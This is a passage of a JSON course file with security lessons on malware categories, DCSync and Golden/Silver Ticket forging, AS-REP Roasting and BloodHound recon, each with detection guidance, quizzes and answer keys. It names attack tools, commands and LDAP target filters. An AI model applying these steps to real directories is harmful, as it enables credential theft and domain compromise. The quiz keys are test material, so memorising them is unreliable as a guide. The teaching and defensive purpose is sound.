        "alt": "A field guide to malware types organised by purpose rather than by name. How it spreads: a virus needs a host file plus a user to run it, a worm self-propagates across the network with no host, a trojan is disguised as something the user wants. How it hides: a rootkit hides deep in the kernel to evade detection, fileless malware lives in memory with no file to scan, packers and crypters obfuscate the code. How it delivers: a dropper carries and drops the payload, a loader fetches and runs the next stage, a downloader pulls more malware. What it steals: spyware watches the user, an infostealer grabs passwords, cookies, and wallets, a keylogger records keystrokes. How it controls: a RAT gives full remote control, a bot joins a botnet and takes commands, a backdoor provides quiet re-entry. The payoff or impact: ransomware encrypts and extorts, a wiper destroys data with no ransom, a cryptominer steals compute. Two ideas to carry: the labels overlap and combine, since real malware is usually several of these at once such as a trojan dropper that loads an infostealer, so describe what the sample does rather than hunting one label; and the category tells you what to check next — infostealer means what credentials and data left, worm means which other hosts, RAT means what command and control, ransomware means scope and backups.",
        "caption": "Malware is categorised by PURPOSE — spread, hide, deliver, steal, control, payoff. Real samples combine several, so describe what it DOES; each category drives the next investigation question.",
        "credit": "Figure authored for this course."
      }
    }
  ],
  "keyTakeaways": [
    "Malware terms describe PURPOSE, not exclusive labels, and real samples combine many at once (a trojan dropper that loads an infostealer and installs a backdoor). Learn them as lenses: how it spreads (virus needs host+user; worm self-propagates; trojan is a user-tricking disguise), how it hides (rootkit=kernel stealth; fileless=in-memory; packer=obfuscation), and how it's delivered (dropper carries the payload; loader/downloader fetches the next stage).",
    "The rest is theft, control, and payoff: spyware/infostealer/keylogger STEAL (creds, cookies, wallets, keystrokes); RAT/bot/backdoor give the attacker CONTROL and re-entry; ransomware/wiper/cryptominer are the PAYOFF (extort/destroy/steal compute). Naming the category drives your next question — infostealer→what data left, worm→which hosts, RAT/backdoor→what C2 and re-entry, ransomware→scope + backups — so the type is the fastest route to the right investigation and response."
  ],
  "quiz": [
    {
      "question": "During triage you determine a sample was disguised as a software update the user ran (no self-spreading), which then wrote a second program to disk and executed it; that second program harvested saved browser passwords and cookies and sent them out. Using the purpose-based categories, how would you describe this sample, and why does the description matter more than a single label?",
      "options": [
        {
          "label": "It is simply 'a virus', because all malware is a virus, and forcing every sample into that one category is the standard and correct way analysts classify malicious software",
          "value": "a"
        },
        {
          "label": "A trojan (disguise, no self-spread) acting as a dropper (writes + runs a second stage) delivering an infostealer (harvests creds/cookies) — naming what it DOES tells you what data left and which accounts are exposed",
          "value": "b"
        },
        {
          "label": "It must be a worm, because any malware that writes a file to disk is by definition self-propagating across the network, which is the single defining property of every type of malware",
          "value": "c"
        },
        {
          "label": "The categories are irrelevant labels, so the only correct action is to record the file hash and close the case, since what a sample actually does has no bearing on the investigation",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The sample combines categories by purpose: a trojan (disguised as an update, relying on the user, not self-spreading), acting as a dropper (writing and running a second stage), which is an infostealer (harvesting saved passwords and cookies and exfiltrating them). Describing what it does across categories is what drives the investigation — an infostealer means you must determine what credentials and data left and which accounts are now exposed. Option a wrongly collapses everything to 'virus.' Option c misdefines a worm (writing a file is not self-propagation). Option d dismisses the categories that actually direct the response."
    },
    {
      "question": "An analyst confirms a host is infected with a worm. Beyond cleaning the infected host, what is the single most urgent question the 'worm' category should immediately prompt, and why?",
      "options": [
        {
          "label": "What ransom amount is being demanded, because every worm's defining purpose is to encrypt files and extort payment, so the ransom note is always the first thing to locate and analyse",
          "value": "a"
        },
        {
          "label": "Which other hosts has it already spread to — because a worm self-propagates across the network on its own, so by the time one host is found the infection has very likely reached others that must be found and contained",
          "value": "b"
        },
        {
          "label": "Nothing further is needed, because a worm cannot spread beyond the single machine it first infects, so cleaning that one host fully resolves the entire incident with no wider scope",
          "value": "c"
        },
        {
          "label": "What the user clicked to run it, because a worm requires a user to open a host file to propagate, making the user's action the only relevant factor in a worm investigation",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A worm's defining property is that it self-propagates across the network with no host file and no user action, so identifying a worm should immediately raise the scope question: which other hosts has it already reached? By the time you find one infected machine, a worm has likely spread further, and containment depends on finding and isolating the rest. Option a confuses worms with ransomware. Option c is exactly wrong — self-spreading is the whole danger. Option d describes a virus (needs a host file and user), not a worm, which needs neither."
    }
  ],
  "references": [
    "https://attack.mitre.org/tactics/TA0002/",
    "https://www.cisa.gov/news-events/news/understanding-hidden-threats-rootkits-and-botnets",
    "https://attack.mitre.org/software/"
  ],
  "xp": 170,
  "estimatedMinutes": 34,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-dcsync-golden-silver-ticket",
  "slug": "dcsync-golden-silver-ticket",
  "title": "DCSync, the krbtgt Hash, and Forging Golden & Silver Tickets",
  "topic": "Active Directory Attacks",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "Once an attacker can replicate directory data or steal the krbtgt account's hash, they no longer need to steal individual passwords: they can mint their own Kerberos tickets. This lesson unpacks DCSync, Golden Tickets, and Silver Tickets, why each equals full domain compromise, and the exact events a SOC uses to catch them.",
  "sections": [
    {
      "heading": "DCSync: Impersonating a Domain Controller",
      "content": "**DCSync** (MITRE **T1003.006**, OS Credential Dumping: DCSync) is a technique where an attacker abuses the **Directory Replication Service (DRS)** protocol to ask a real Domain Controller to replicate account secrets, including password hashes. Instead of running code on the DC, the attacker's workstation simply *pretends to be another DC* and issues a legitimate replication request. Tools like Mimikatz (`lsadump::dcsync`) and Impacket's `secretsdump.py` implement this.\n\nThe request works because AD replication is a normal, trusted operation. To pull secrets, the calling identity needs three **extended rights** on the domain object:\n\n- **DS-Replication-Get-Changes**\n- **DS-Replication-Get-Changes-All** (the powerful one, exposing secret attributes)\n- **DS-Replication-Get-Changes-In-Filtered-Set**\n\nBy default only **Domain Admins**, **Enterprise Admins**, and Domain Controllers hold these rights. Attackers reach DCSync by first compromising a privileged account, or by finding a misconfigured **ACL** that grants replication rights to a lower-tier principal (a common BloodHound finding).\n\nThe crown jewel DCSync targets is the **krbtgt** account hash. Because krbtgt signs every Kerberos ticket in the domain, one successful DCSync of krbtgt hands the attacker the key to forge authentication for *any* user indefinitely.\n\n| Attribute | Meaning for the attacker |\n|---|---|\n| NTLM hash | Pass-the-Hash, offline cracking |\n| krbtgt hash | Golden Ticket forging |\n| Service account hash | Silver Ticket forging |\n\nDCSync is quiet precisely because it looks like routine replication traffic, which is why detection depends on knowing *which hosts should ever replicate*."
    },
    {
      "heading": "The Golden Ticket: Forging a TGT",
      "content": "A **Golden Ticket** (**T1558.001**, Steal or Forge Kerberos Tickets: Golden Ticket) is a **forged Ticket-Granting Ticket (TGT)** created offline using the stolen **krbtgt** key. In normal Kerberos, the KDC issues a TGT encrypted and signed with the krbtgt key; the client later presents that TGT to request service tickets. Because the attacker now *holds* the krbtgt key, they can build a TGT themselves without the KDC ever validating a password.\n\nTo forge one, the attacker needs:\n\n- The **domain SID**\n- The **krbtgt** NTLM/AES key\n- A target username (often a nonexistent or Administrator account)\n\nWith Mimikatz `kerberos::golden`, they can set an **arbitrary group membership** (e.g., claim membership in Domain Admins via the PAC) and an **arbitrary lifetime**. Default Mimikatz Golden Tickets historically requested a **10-year lifetime**, wildly outside the normal 10-hour TGT and 7-day renewal policy, which is a strong detection tell.\n\nBecause the forged TGT is trusted domain-wide, a Golden Ticket grants access to **any service on any host**, survives user password resets, and even survives disabling the impersonated account. The **only** effective invalidation is rotating the krbtgt password **twice** (two rotations are required because AD keeps the current and previous key for replication continuity; a single rotation still lets old tickets validate).\n\nGolden Tickets can also carry **fabricated PAC data**, letting the attacker inject SIDs via **SID History** to bypass group-based controls. This is why a Golden Ticket is considered *game over*: the attacker owns the domain's trust root itself, not merely one account."
    },
    {
      "heading": "The Silver Ticket: Forging a Service Ticket",
      "content": "A **Silver Ticket** (**T1558.002**, Silver Ticket) is a **forged Ticket-Granting Service (TGS) ticket** for one specific service, signed with that **service account's** password hash rather than krbtgt. If an attacker cracks or dumps the hash of a service account (or a computer account, whose hash protects services like **CIFS**, **HOST**, or **MSSQLSvc**), they can forge a TGS for that service directly.\n\nThe key operational difference: a Silver Ticket **never contacts the KDC at all**. The client normally requests a TGS from the DC, but with a Silver Ticket the attacker crafts it locally and presents it straight to the target service, which validates it using its own key. This makes Silver Tickets **stealthier than Golden Tickets** because there are *no DC-side ticket-request events* to observe.\n\nComparison at a glance:\n\n| Property | Golden Ticket | Silver Ticket |\n|---|---|---|\n| Signed with | krbtgt key | Service/computer account key |\n| Ticket type | TGT | TGS (service ticket) |\n| Scope | Entire domain | Single service on one host |\n| Touches DC? | For service tickets, yes | No |\n| Invalidated by | Rotating krbtgt twice | Rotating that service account password |\n\nThe scope tradeoff matters: a Silver Ticket only unlocks the targeted service (e.g., the file share via CIFS, or WMI via HOST), but the reduced blast radius is offset by far lower visibility. Attackers often chain Silver Tickets for lateral movement and persistence while avoiding the noisier Golden Ticket, especially against **computer accounts** whose long, machine-generated passwords rarely rotate on a schedule administrators track."
    },
    {
      "heading": "Detection: The Events That Betray Forged Tickets",
      "content": "**DCSync detection** hinges on **Event ID 4662** (An operation was performed on an object) on Domain Controllers. Watch for 4662 events where the accessed **Properties** GUID matches the replication rights and the **subject is not a Domain Controller**:\n\n- **1131f6aa-9c07-11d1-f79f-00c04fc2dcd2** (DS-Replication-Get-Changes)\n- **1131f6ad-9c07-11d1-f79f-00c04fc2dcd2** (DS-Replication-Get-Changes-All)\n\nA user or workstation triggering these GUIDs is a high-fidelity DCSync signal. Correlate with network flows: legitimate replication is DC-to-DC only, so a replication request sourced from a non-DC IP is anomalous.\n\n**Golden Ticket tells** appear in **Event ID 4769** (Kerberos service ticket requested) and **4768** (TGT requested). Because a forged TGT was never issued by the KDC, you often see a **4769 with no preceding 4768** for that user. Also flag:\n\n- **Anomalous ticket lifetimes** far exceeding domain Kerberos policy (the classic 10-year artifact).\n- **Encryption type downgrades** to **RC4 (0x17)** where the environment normally uses **AES (0x12/0x11)**, since older forging tools default to RC4.\n- **Mismatched or blank account fields**, such as tickets for accounts that do not exist in AD, or a username whose domain/SID does not resolve.\n\n**Silver Ticket detection** is harder because the DC is bypassed. Pivot to the **target host's** logs: **Event ID 4624** (logon) and **4672** (special privileges assigned) appearing **without any corresponding 4768/4769 on the DC** indicates a service ticket that the KDC never issued. Feed all of these into UEBA baselines; ticket-lifetime and encryption anomalies are exactly the low-noise indicators SIEM correlation rules should key on."
    },
    {
      "heading": "Defence: Protecting the Trust Root",
      "content": "The strategic goal is to keep the **krbtgt** key and privileged hashes out of attacker hands, and to make forged tickets short-lived if a key does leak.\n\n**Protect and rotate krbtgt.** Treat krbtgt as the most sensitive secret in the domain. Rotate its password on a defined schedule and **immediately, twice**, after any suspected DA compromise. The double rotation is mandatory because AD retains the previous key (kvno N-1) for replication; a single reset leaves existing Golden Tickets valid. Microsoft and community scripts (e.g., the New-KrbtgtKeys reset tooling) automate a safe, replication-aware rotation.\n\n**Enforce administrative tiering.** Implement the **tiered model** (Tier 0 = DCs, AD, and identity systems; Tier 1 = servers; Tier 2 = workstations). Never let Tier 0 credentials log on to Tier 2 machines, where they can be scraped from LSASS. This directly starves DCSync of the privileged accounts it needs.\n\n**Harden credential exposure.**\n\n- Enable **Windows Defender Credential Guard** to isolate secrets in a VBS enclave, blocking LSASS hash theft.\n- Add sensitive accounts to the **Protected Users** group and mark them *Account is sensitive and cannot be delegated*.\n- Prefer **AES** Kerberos encryption and disable **RC4** where feasible, shrinking the attack surface and making RC4 usage itself an alert.\n\n**Audit and monitor replication rights.** Regularly review which principals hold **DS-Replication-Get-Changes-All** on the domain object; only DCs and intended admins should. Alert on any new grant. Use **gMSA** for service accounts so their long passwords rotate automatically, weakening Silver Ticket persistence. Finally, restrict **SeEnableDelegationPrivilege** and monitor for unexpected **SID History** values, which forged PACs abuse to smuggle privileged SIDs."
    }
  ],
  "keyTakeaways": [
    "DCSync (T1003.006) abuses AD replication rights to steal the krbtgt hash; that single hash lets an attacker forge Golden Tickets (T1558.001) that impersonate any user domain-wide, and only rotating krbtgt twice truly invalidates them.",
    "Golden Tickets forge a TGT with the krbtgt key (whole-domain, visible in 4769/4768 anomalies), while Silver Tickets (T1558.002) forge a single service TGS with a service/computer account key and bypass the DC entirely, so detection shifts to the target host's 4624/4672 events."
  ],
  "quiz": [
    {
      "question": "A SOC analyst spots Event ID 4662 on a Domain Controller where a standard user workstation accessed the object property GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2. What is the most likely activity, and why is it dangerous?",
      "options": [
        {
          "label": "A benign group policy refresh reading directory objects, which is expected background traffic on every domain-joined workstation each cycle.",
          "value": "a"
        },
        {
          "label": "A DCSync attempt using Get-Changes-All replication rights, dangerous because it can extract the krbtgt hash for ticket forging.",
          "value": "b"
        },
        {
          "label": "A routine LDAP bind from an authenticated user enumerating their own group memberships during an interactive logon session.",
          "value": "c"
        },
        {
          "label": "A normal krbtgt password rotation being replicated between two domain controllers as part of scheduled maintenance activity.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: the GUID 1131f6ad is DS-Replication-Get-Changes-All, and a non-DC workstation invoking it via 4662 is a classic DCSync signature that can pull the krbtgt hash. (a) GPO refreshes do not request replication extended rights. (c) LDAP group enumeration does not touch replication property GUIDs. (d) Replication happens DC-to-DC, not from a user workstation, so a workstation source rules this out."
    },
    {
      "question": "During an investigation you find a host with Event ID 4624 and 4672 for a privileged logon to a file service, but the Domain Controllers show no matching 4768 or 4769 for that session. Which attack best explains this pattern?",
      "options": [
        {
          "label": "A Golden Ticket, because the forged TGT would generate a burst of 4768 pre-authentication events visible directly on the domain controllers.",
          "value": "a"
        },
        {
          "label": "A Silver Ticket, because the forged service ticket is validated by the target service itself and never reaches the domain controller.",
          "value": "b"
        },
        {
          "label": "AS-REP Roasting, because the attacker requested authentication data for a preauth-disabled account through the domain controller.",
          "value": "c"
        },
        {
          "label": "A standard Pass-the-Hash logon, which always produces a corresponding 4769 service ticket request on the issuing domain controller.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: a Silver Ticket forges a TGS signed with the service/computer account key and is presented straight to the service, so no 4768/4769 appears on the DC while the host still logs 4624/4672. (a) Golden Tickets do produce DC-side 4769 traffic when requesting service tickets, unlike this DC-silent pattern. (c) AS-REP Roasting is a credential-cracking recon step, not a host logon. (d) Pass-the-Hash over Kerberos still involves DC ticket requests, so the missing DC events contradict it."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1003/006/",
    "https://attack.mitre.org/techniques/T1558/001/",
    "https://learn.microsoft.com/en-us/defender-for-identity/credential-access-alerts"
  ],
  "xp": 240,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-as-rep-roasting",
  "slug": "as-rep-roasting",
  "title": "AS-REP Roasting: Cracking Accounts That Skip Kerberos Preauth",
  "topic": "Active Directory Attacks",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "AS-REP Roasting exploits a single dangerous account setting: 'Do not require Kerberos preauthentication.' When it is set, any attacker can request an authentication response containing material encrypted with the user's password, then crack it offline. This lesson covers the mechanics, how it differs from Kerberoasting, and the events that expose it.",
  "sections": [
    {
      "heading": "What AS-REP Roasting Is",
      "content": "**AS-REP Roasting** (MITRE **T1558.004**, Steal or Forge Kerberos Tickets: AS-REP Roasting) is an offline password-cracking attack against Active Directory accounts that have **Kerberos pre-authentication disabled**. The vulnerable configuration is the account flag **DONT_REQ_PREAUTH** in the `userAccountControl` attribute (value bit **0x400000**).\n\nTo understand the attack, recall the first step of Kerberos authentication, the **AS-REQ / AS-REP** exchange with the Key Distribution Center (KDC). Normally, a client must prove it knows the user's password *before* the KDC responds, by sending a **timestamp encrypted with the user's key** inside the AS-REQ. This is **pre-authentication**. The KDC decrypts the timestamp; only if it succeeds does it return the **AS-REP**.\n\nWhen preauth is **disabled**, the KDC skips that proof. It will hand out an **AS-REP to anyone** who asks for that username, no password required. Critically, part of that AS-REP, the **encrypted portion containing the session key**, is encrypted with a key **derived from the user's password**. The attacker captures this ciphertext and attacks it **offline** with Hashcat (mode **18200**) or John the Ripper, trying candidate passwords until one produces valid plaintext.\n\nBecause the cracking is entirely offline, there is **no lockout, no failed-logon noise, and no rate limit** protecting the account. The only real defence is a password strong enough to resist offline cracking, or removing the preauth exemption. Preauth is sometimes disabled for legacy interoperability or misconfigured application/service accounts, which is exactly where attackers hunt."
    },
    {
      "heading": "How the Attack Works Step by Step",
      "content": "The attacker does not need valid domain credentials to *find and roast* preauth-disabled accounts, though authenticated context makes enumeration easier. The flow:\n\n1. **Discover targets.** Enumerate accounts whose `userAccountControl` contains the **DONT_REQ_PREAUTH** bit. An LDAP filter such as `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` returns exactly these accounts. Tools like **Rubeus** (`asreproast`), **Impacket's GetNPUsers.py**, and PowerView automate this.\n\n2. **Request the AS-REP.** For each vulnerable account, the tool sends an **AS-REQ** to the KDC *without* the encrypted pre-auth timestamp. Because preauth is off, the KDC replies with a full **AS-REP**.\n\n3. **Extract the crackable blob.** The tool pulls the **encrypted part of the AS-REP** (the field encrypted with the account's long-term key) and formats it as a hash string, for example `$krb5asrep$23$user@DOMAIN...`. The `23` denotes **RC4-HMAC (etype 0x17)**, the weakest and most crack-friendly encryption type, which older tooling requests deliberately.\n\n4. **Crack offline.** Feed the hash to **Hashcat -m 18200** with a wordlist and rules. Every guess is validated locally against the ciphertext, so throughput is limited only by the attacker's GPUs.\n\n5. **Use the password.** A recovered plaintext password is then used for authenticated access, lateral movement, or privilege escalation.\n\nThe most damaging variant targets **privileged accounts** that someone carelessly exempted from preauth. A single weak password on such an account can convert a foothold into domain-wide compromise, which is why AS-REP Roasting is a staple of the recon-to-escalation chain."
    },
    {
      "heading": "AS-REP Roasting vs Kerberoasting",
      "content": "Both attacks recover a password by cracking Kerberos-derived ciphertext offline, but they target **different accounts, different tickets, and different prerequisites**. Confusing them leads to wrong detection logic, so know the distinction cold.\n\n| Aspect | AS-REP Roasting (T1558.004) | Kerberoasting (T1558.003) |\n|---|---|---|\n| Targeted accounts | Users with **preauth disabled** (DONT_REQ_PREAUTH) | Accounts with a **Service Principal Name (SPN)** |\n| Kerberos message | **AS-REP** (initial auth exchange) | **TGS-REP** (service ticket) |\n| Encrypted with | Target **user's** password-derived key | Target **service account's** password-derived key |\n| Needs valid domain creds? | **No** (can be fully unauthenticated) | **Yes** (must be able to request a TGS) |\n| Key event ID | **4768** (AS ticket requested) | **4769** (service ticket requested) |\n| Hashcat mode | **18200** | **13100** |\n\nThe pivotal difference for a SOC: **Kerberoasting requires an authenticated attacker** who can request service tickets, so it shows up in **4769** logs. **AS-REP Roasting can be unauthenticated** and surfaces in **4768** logs. Both share the same weakness, **RC4 encryption plus weak passwords**, and both are defeated by strong passwords and, where applicable, **gMSA** service accounts. But only AS-REP Roasting is fixed by simply **re-enabling pre-authentication**, since Kerberoasting cannot be stopped by removing SPNs that services legitimately need."
    },
    {
      "heading": "Detection and Defence",
      "content": "**Detection** centres on **Event ID 4768** (A Kerberos authentication ticket (TGT) was requested) on Domain Controllers. AS-REP Roasting leaves distinctive fingerprints:\n\n- **Pre-Authentication Type = 0** in the 4768 event. A value of **0** means *no preauth was performed*, which is the smoking gun. Normal interactive logons show a non-zero preauth type (commonly 2).\n- **Ticket Encryption Type = 0x17 (RC4-HMAC)**. Tooling requests RC4 because it cracks fastest. In an AES-standard environment, RC4 in a 4768 is anomalous and alert-worthy.\n- **Volume and pattern**: many 4768 requests for different usernames from one source in a short window suggests bulk roasting rather than a user logging in.\n\nBuild a SIEM correlation rule for `EventID=4768 AND PreAuthType=0`, enrich with the encryption type, and baseline which accounts legitimately have preauth disabled so real exposure stands out. A **honeytoken** account, deliberately created with preauth disabled, a tempting name, and a long random password, is a high-fidelity tripwire: any AS-REP request for it is malicious.\n\n**Defence** attacks the root cause:\n\n- **Require Kerberos pre-authentication.** Audit `userAccountControl` for the **DONT_REQ_PREAUTH (0x400000)** flag and remove it wherever legacy needs do not truly require it. This alone neutralises the attack.\n- **Enforce strong, long passwords** (25+ characters for exempt or service accounts), since offline cracking is bounded only by password strength. Prefer **gMSA** so passwords are machine-generated and auto-rotated.\n- **Disable RC4** and standardise on **AES** Kerberos encryption, removing the weak etype attackers rely on.\n- **Continuously audit the flag** with scheduled scripts and alert on any newly added preauth exemption, since a fixed setting can silently regress during migrations or app onboarding."
    }
  ],
  "keyTakeaways": [
    "AS-REP Roasting (T1558.004) targets accounts with the DONT_REQ_PREAUTH flag (userAccountControl 0x400000): the KDC returns an AS-REP whose encrypted portion is derived from the user's password, letting the attacker crack it offline (Hashcat 18200) with no lockout or logon noise.",
    "Detect it on Event ID 4768 where Pre-Authentication Type = 0 and encryption type = RC4 (0x17); defend by re-enabling preauth, enforcing long passwords/gMSA, disabling RC4, and planting a preauth-disabled honeytoken account as a tripwire."
  ],
  "quiz": [
    {
      "question": "An analyst wants a high-fidelity SIEM rule for AS-REP Roasting. Which Event ID 4768 condition most reliably indicates the attack rather than normal authentication?",
      "options": [
        {
          "label": "A logon occurring outside business hours from a service account that normally authenticates during scheduled batch windows.",
          "value": "a"
        },
        {
          "label": "A Pre-Authentication Type value of 0 combined with RC4-HMAC (0x17) encryption for the requested ticket.",
          "value": "b"
        },
        {
          "label": "A successful ticket request immediately followed by several LDAP queries enumerating the user's group memberships.",
          "value": "c"
        },
        {
          "label": "Multiple failed logon attempts against the same account triggering the domain account lockout threshold policy.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: Pre-Auth Type 0 means no pre-authentication was performed, the defining trait of AS-REP Roasting, and RC4 encryption reflects the attacker choosing the weakest crackable etype. (a) Off-hours logons are a weak, generic anomaly, not specific to roasting. (c) LDAP enumeration is separate recon activity, not the AS-REP signature. (d) AS-REP Roasting causes no failed logons or lockouts because cracking is entirely offline, so lockouts actually point elsewhere."
    },
    {
      "question": "A junior analyst says AS-REP Roasting and Kerberoasting are 'basically identical.' Which statement correctly distinguishes them for detection purposes?",
      "options": [
        {
          "label": "AS-REP Roasting requires valid domain credentials to request tickets, whereas Kerberoasting can always be executed by a fully unauthenticated attacker.",
          "value": "a"
        },
        {
          "label": "AS-REP Roasting targets preauth-disabled users via 4768, while Kerberoasting targets SPN accounts via 4769 and needs an authenticated context.",
          "value": "b"
        },
        {
          "label": "Both attacks are prevented entirely by removing Service Principal Names, since neither can function without an SPN attached to the account.",
          "value": "c"
        },
        {
          "label": "Kerberoasting cracks the AS-REP encrypted blob while AS-REP Roasting cracks the TGS-REP service ticket returned by the domain controller.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: AS-REP Roasting exploits preauth-disabled users and appears in 4768, whereas Kerberoasting exploits SPN accounts, requires authentication to request a TGS, and appears in 4769. (a) Reverses the prerequisites: AS-REP Roasting can be unauthenticated, Kerberoasting cannot. (c) Removing SPNs cannot fix Kerberoasting for services that legitimately need them, and does nothing for AS-REP Roasting. (d) Swaps the tickets: AS-REP Roasting cracks the AS-REP, Kerberoasting cracks the TGS-REP."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1558/004/",
    "https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768",
    "https://learn.microsoft.com/en-us/defender-for-identity/credential-access-alerts"
  ],
  "xp": 240,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-ldap-bloodhound-ad-recon",
  "slug": "ldap-bloodhound-ad-recon",
  "title": "LDAP and BloodHound: Mapping the Attack Paths in Active Directory",
  "topic": "Active Directory Attacks",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Before any Kerberoast, DCSync, or lateral move, an attacker asks a simpler question: who has power over what? Active Directory answers that question freely over LDAP, and BloodHound turns the answers into a graph of attack paths. This lesson explains AD reconnaissance, what SharpHound collects, and how a SOC detects the enumeration.",
  "sections": [
    {
      "heading": "Why Recon Comes First",
      "content": "Active Directory is a **directory service**: a queryable database of users, groups, computers, and their relationships, exposed primarily over **LDAP** (Lightweight Directory Access Protocol, TCP **389**, or **636** for LDAPS). By design, **any authenticated domain user can read most of the directory**. This openness is a feature for applications, but a gift for attackers.\n\nReconnaissance precedes every serious AD attack because attacks are **relationship-driven**. Kerberoasting needs to know *which accounts have SPNs*. AS-REP Roasting needs to know *which accounts lack preauth*. DCSync needs to know *who holds replication rights*. Privilege escalation needs to know *which low-privilege account can reset a high-privilege account's password*. All of this is discoverable by *reading* AD, not attacking it.\n\nRelevant MITRE techniques map cleanly to enumeration goals:\n\n- **T1087** Account Discovery: enumerate users.\n- **T1069** Permission Groups Discovery: enumerate groups and memberships.\n- **T1482** Domain Trust Discovery: enumerate trusts between domains/forests.\n- **T1018** Remote System Discovery and **T1033/T1016** for hosts and sessions.\n\nAn attacker's mental model is a **graph**: nodes are principals (users, groups, computers) and edges are rights (MemberOf, AdminTo, CanRDP, GenericAll, WriteDACL, ForceChangePassword). The attacker's job is to find a **path** from their current low-privilege node to a high-value node like Domain Admins. Recon builds that graph, and the graph, not brute force, is what makes modern AD compromise fast and reliable. Understanding recon is therefore the foundation for detecting the entire kill chain early, while the attacker is still just *looking*."
    },
    {
      "heading": "Enumerating AD Over LDAP",
      "content": "Attackers query LDAP directly using built-in and offensive tooling: `ldapsearch`, PowerShell's `Get-ADUser`, **PowerView**, **AD Explorer**, and Impacket scripts. Because reads are broadly permitted, most of this looks like ordinary directory traffic. Key enumeration targets:\n\n- **Users (T1087).** Pull `sAMAccountName`, `description` (admins sometimes store passwords here), `userAccountControl` (revealing disabled accounts and the **DONT_REQ_PREAUTH** flag), and `lastLogonTimestamp` to find stale accounts.\n- **Groups and membership (T1069).** Map who belongs to **Domain Admins**, **Enterprise Admins**, **Account Operators**, and other privileged groups, following nested memberships.\n- **SPNs.** Query `servicePrincipalName` to build a Kerberoasting target list in one filter.\n- **Trusts (T1482).** Enumerate `trustedDomain` objects to find paths into other domains or forests, and whether trusts are transitive.\n- **ACLs.** Read the **security descriptor** (`nTSecurityDescriptor`) on objects to find dangerous rights like **GenericAll**, **WriteDACL**, **WriteOwner**, and **ForceChangePassword** that enable privilege escalation without any exploit.\n\nA representative LDAP filter for SPN accounts is `(&(objectClass=user)(servicePrincipalName=*))`; for preauth-disabled accounts it is `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`. These bitwise **matching-rule OIDs** let an attacker slice `userAccountControl` flags precisely.\n\nThe strategic insight is that **ACLs are the hidden attack surface**. Group membership is obvious, but delegated rights, someone who can reset a service account's password, or write to a group's membership, are where real, non-obvious escalation paths hide. Reading them requires no special privilege, only knowing to look, which is exactly what BloodHound automates."
    },
    {
      "heading": "BloodHound and SharpHound: The Attack-Path Graph",
      "content": "**BloodHound** is an open-source tool that ingests AD data and renders it as an **interactive graph database** (Neo4j), letting an attacker (or defender) run queries like *\"shortest path from this user to Domain Admins.\"* Its data collector is **SharpHound** (a C# collector; `SharpHound.exe` or the PowerShell/BloodHound-python variants).\n\n**SharpHound collects**, largely over LDAP plus some host-level queries:\n\n- **Domain objects**: users, groups, computers, OUs, GPOs, trusts.\n- **Group memberships**, including nested chains.\n- **ACLs / object rights**: GenericAll, WriteDACL, WriteOwner, AddMember, ForceChangePassword, and more, the edges that enable non-exploit escalation.\n- **Sessions** (via collection methods like **Session**/**LoggedOn**): *which users are logged on to which machines right now*, revealing where privileged credentials are exposed for theft.\n- **Local admin rights** (**AdminTo**), **RDP** and **DCOM** access, and **constrained/unconstrained delegation** settings.\n\nBloodHound then models everything as **nodes and edges**. The power is in **transitive pathfinding**: even if no single step is alarming, chaining `ForceChangePassword -> MemberOf -> AdminTo` can walk an attacker from a helpdesk account to a DC. Pre-built queries (\"Find Shortest Paths to Domain Admins\", \"Find Principals with DCSync Rights\") turn hours of manual analysis into seconds.\n\nCollection **methods** matter for detection. **Default/DCOnly** collection hits mainly the DC over LDAP and is quiet; **All** or **Session** collection touches many workstations to gather logon and local-admin data, generating far more network noise. Understanding which method was used helps a SOC gauge how aggressively the environment was swept. Defenders should run BloodHound themselves, proactively, to find and cut the same paths attackers would exploit."
    },
    {
      "heading": "Detection and Defence",
      "content": "**Detection** of AD recon is challenging because reading the directory is normal. Focus on **volume, breadth, and rights-focused reads** rather than any single query.\n\n- **Event ID 4662** (An operation was performed on an object). Aggressive SharpHound ACL collection generates **large numbers of 4662 reads** across many objects from one principal in a short window. A single account touching thousands of objects, especially reading security descriptors, is a strong enumeration signal. (Note: 4662 requires SACL auditing to be configured on the objects.)\n- **Event ID 4661** (A handle to an object was requested) can similarly spike during bulk enumeration.\n- **LDAP query telemetry.** Domain Controllers can log expensive/inefficient LDAP searches; broad filters like `(objectClass=*)` or bitwise `userAccountControl` scans from a workstation are suspicious. Microsoft Defender for Identity flags **LDAP reconnaissance** and **SharpHound-style enumeration** patterns.\n- **SharpHound behavioural tells**: a burst of connections from one host to **many machines** (Session/LoggedOn collection), and rapid sequential LDAP binds enumerating users, groups, and ACLs together.\n\n**Honeytoken accounts** are the highest-value tripwire: a decoy user/computer with an enticing name (e.g., `svc_backup_admin`) and no legitimate use. Any LDAP read, Kerberos request, or BloodHound edge touching it is almost certainly malicious, and it appears prominently in SharpHound output, catching the collection itself.\n\n**Defence** reduces both exposure and payoff:\n\n- **Least privilege and ACL hygiene.** Remove dangerous delegated rights (GenericAll, WriteDACL) that create escalation edges; audit ACLs regularly, ideally by running BloodHound defensively.\n- **Administrative tiering** so that enumerating a workstation never reveals Tier 0 sessions to steal.\n- **Reduce readable attack surface**: clear secrets from `description` fields, retire stale accounts, and constrain sensitive attribute visibility where possible.\n- **Deploy Microsoft Defender for Identity** on DCs for behavioural recon detection, and baseline normal 